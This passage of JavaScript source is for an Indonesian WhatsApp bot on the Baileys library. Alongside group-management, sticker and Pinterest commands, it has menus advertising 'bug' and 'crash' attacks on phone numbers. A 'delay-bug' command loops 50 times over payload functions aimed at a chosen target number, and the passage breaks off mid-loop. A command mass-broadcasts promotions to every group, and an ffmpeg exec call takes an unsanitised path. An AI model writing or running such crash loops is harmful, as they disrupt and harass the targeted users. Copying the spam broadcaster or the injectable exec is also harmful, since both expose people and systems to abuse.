│※ 𝐎𝐰𝐧 𝐍𝐨 : 𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲
║※ 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
│▬▭「 🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 」▭▬
║
╰━━━━━━━━━━━━━━━━━━━ ᬼ
╰⪩｟   𝕽𝕺𝕺𝕿 𝕮𝕽𝕬𝕾𝕳  ｠⪨╯
║››bang-on? 62xxx
║›› hard 62xxx
║›› sing-sing 62xxx
 𝄽ᴠ  ͢ɪ ᴘ ʙᴜɢ ᬼ ᴠᴇʀsɪᴏɴ [ 3.0 ]☠
──────────────🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃`
reply(toolsmenu)
}
break

case 'bugsuper-v3': {
await loading()
const version = require("baileys/package.json").version
const toolsmenu = `╭──( 💞⃟𒆜ᥴіᥴі іmᥙ𝗍⃟╳🌸 )
║ᨒ 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝗦𝗘𝗖𝗥𝗜𝗣𝗧: [𝟯.𝟬]
│ ※ 𝐍𝐚𝐦𝐞 : ${m.pushName}
║▬▭▬▭▬▭▬▭▬▭
│ 𝐎𝐰𝐧𝐞𝐫 : ${author}
║※ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 💞⃟𒆜ᥴіᥴі іmᥙ𝗍⃟╳🌸
│※ 𝐎𝐰𝐧 𝐍𝐨 : 𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲
║※ 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
│▬▭「 💞⃟𒆜ᥴіᥴі іmᥙ𝗍⃟╳🌸 」▭▬
║
╰━━━━━━━━━━━━━━━━━━━ ᬼ
┏────────ᥫ᭡
║​᭄ superdupelcici 62xxx
╰──────────
 𝄽ᴠ  ͢ɪ ᴘ ʙᴜɢ ᬼ ᴠᴇʀsɪᴏɴ [ 3.0 ]☠️
──────────────💞⃟𒆜ᥴіᥴі іmᥙ𝗍⃟╳🌸`
reply(toolsmenu)
}
break


case 'z': case 'hidetag': case 'h':
//if (!isRegistered) return registerbut(noregis)
if (!isOwner) return reply(mess.only.owner)
if (!text) return reply(`Teks?`)
kandiXD.sendMessage(m.chat, { text : text ? text : '' , mentions: participants.map(a => a.id)}, { quoted: m })
break

case "tagall": {
if (!isOwner && !isAdmins) return reply(mess.admin)
if (!isGroup) return joreply(mess.only.group)
if (!q) return reply(`Teks Nya Mana Kak?`)
let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n`
for (let mem of participants) {
teks += `⊝ @${mem.id.split('@')[0]}\n`
}
kandiXD.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break

case "kick": {
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin :(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kandiXD.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break

case 'closegroup': {
if (!isGroup) return reply(`Khusus Group Bego`)
if (!isAdmins && !isOwner) return reply('Khusus Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin Bego`)
if (!args[0]) return reply(`*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n${prefix+command}10 second`)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
}
reply(`*Waktu dimulai dari sekarang*`)
setTimeout(() => {
var nomor = m.participant
kandiXD.groupSettingUpdate(m.chat, 'announcement')
reply(`Waktu Telah Tiba!\nGrup Ditutup Oleh Bot Dikarenakan Tidak Ada Yg Menjaga Grup\nGrup Akan Dibuka Sesuai Waktu Yg Ditentukan Oleh Admin`)
}, timer)
}
break
case 'pinterest': case 'pin': {
  if (!text) return m.reply(`• *Example:* ${prefix + command} kuro servamp`);
  
  await m.reply("O̖̼ͩ͌͐t̲̂̓ͩ̑ẹ̿͋̒̕w̦̺̐̐͟ẹ̿͋̒̕")
  
  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: kandiXD.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }
  
  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);
  
  shuffleArray(res); // Mengacak array
  let ult = res.splice(0, 2); // Mengambil 10 gambar pertama dari array yang sudah diacak
  let i = 1;
  
  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `Image ke - ${i++}`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: "kandiXD"
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: 'Hasil.',
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
          }
        ]
      })
    });
  }
  
  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: "Done Pin"
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: "kandiXD"
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});
  
  await kandiXD.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
}

break 
case 'opengroup': {
if (!isGroup) return reply(`Khusus Group Bego`)
if (!isAdmins && !isOwner) return reply('Khusus Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin Bego`)
if (!args[0]) return reply(`*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n${prefix+command}10 second`)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
}
reply(`*Waktu dimulai dari sekarang*`)
setTimeout(() => {
var nomor = m.participant
kandiXD.groupSettingUpdate(m.chat, 'not_announcement')
reply(`Tepat Waktu Group Sudah Di Buka Sekarang Semua Peserta Bisa Mengirim Pesan`)
}, timer)
}
break

case "demote": {
if (!isPremium) return reply(mess.only.premium)
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin :(`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kandiXD.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break

case "promote": {
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin :(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kandiXD.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break

case "jpmpromosi": case "jpmpromo": case "jpm3": {
if (!isOwner) return reply(mess.only.owner)
if (!text && !m.quoted) return m.reply("teksnya atau replyteks")
var teks = m.quoted ? m.quoted.text : text
let total = 0
let allfetch = await kandiXD.groupFetchAllParticipating()
let entrygc = Object.entries(allfetch).slice(0).map((entry)=>entry[1])
let finalres = entrygc.filter(entrygc=>entrygc.announce==false)
let usergc = finalres.map(v=>v.id)
m.reply(`Memproses Mengirim Pesan Ke *${usergc.length} Grup*`)
let teksnya = teks
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://whatsapp.com/channel/0029VarnOfo1CYoPhQUMNa0D\",\"merchant_url\":\"https://whatsapp.com/channel/0029VarnOfo1CYoPhQUMNa0D\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"YouTube Owner\",\"url\":\"${linkyt}\",\"merchant_url\":\"https://www.youtube.com/@RafzMods999 \"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testi Di whatsapp\",\"url\":\"${isLink}\",\"merchant_url\":\"https://whatsapp.com/channel/0029VarnOfo1CYoPhQUMNa0D\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"Donate My Dev🙏\",\"url\":\"https://whatsapp.com/channel/0029VarnOfo1CYoPhQUMNa0D\",\"merchant_url\":\"https://whatsapp.com/channel/0029VarnOfo1CYoPhQUMNa0D\"}"
}]
})
})} 
}}, {userJid: m.sender, quoted: m})
for (let jid of usergc) {
try {
await kandiXD.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch {}
await sleep(global.delayjpm)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break

case 'payment': {
let teks = `${monospace("PAYMENT")}

*(E-WALLET)*

   *DANA*
- ${dana}

Harap Setelah Transfer Anda Harus Mengasih Bukti Pembayaran Agar Di Verifikasi Oleh Owner, Tanks For You

© ${storename}`
kandiXD.sendMessage(from, { 
text: teks,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": false,
"title": `QRIS? KLIK DISINI`,
"body": `Date : ${wib}, ${tanggal}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnailUrl": "https://img100.pixhost.to/images/963/544171424_sevsbotz.jpg",
"sourceUrl": `${qris}`
}
}
},{ 
quoted: fkontak })
await sleep(1500)
}
      break

case "toimage":
		case "toimg": {
			if (!/webp/.test(mime)) return reply(`Reply Sticker!!`)
			reply(mess.wait)
			let media = await kandiXD.downloadAndSaveMediaMessage(qmsg)
			let ran = await getRandom(".png")
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
				fs.unlinkSync(media)
				if (err) return err
				let buffer = fs.readFileSync(ran)
				VxoZap.sendMessage(m.chat, {
					image: buffer
				}, {
					quoted: m
				})
				fs.unlinkSync(ran)
			})
		}
		break
		
case "sticker": 
case "stiker":
case "s": {
if (!isOwner) return reply(mess.only.owner)
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await kandiXD.sendStimg(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await kandiXD.sendStvid(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break

case 'delay-bug': case 'agler-system': case 'agler-forger':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 50; i++) {
await sendSessionStructure(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
